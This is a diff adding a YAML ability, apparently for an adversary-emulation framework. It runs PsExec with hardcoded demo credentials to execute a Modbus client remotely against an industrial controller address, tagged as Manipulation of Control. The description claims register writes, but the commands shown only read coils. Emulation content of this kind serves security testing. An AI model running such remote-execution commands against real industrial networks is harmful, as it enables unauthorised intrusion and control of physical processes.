@@ -1,0 +1,15 @@
+- id: tx0_lateral_exec_attack_tool
+  name: TX0_Lateral_Exec_Attack_Tool
+  description: Execute multiple register write commands remotely via PsExec using PowerShell.
+  tactic: impact
+  technique:
+    attack_id: T0831
+    name: Manipulation of Control
+  platforms:
+    windows:
+      psh:
+        command: |
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', '-d', '-realtime', 'C:\Windows\Temp\modbus_cli.exe', '192.168.95.2', 'read_c', '1026', '1' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', '-d', '-realtime', 'C:\Windows\Temp\modbus_cli.exe', '192.168.95.2', 'read_c', '1027', '1' -NoNewWindow;
+        payloads:
+          - psexec.exe
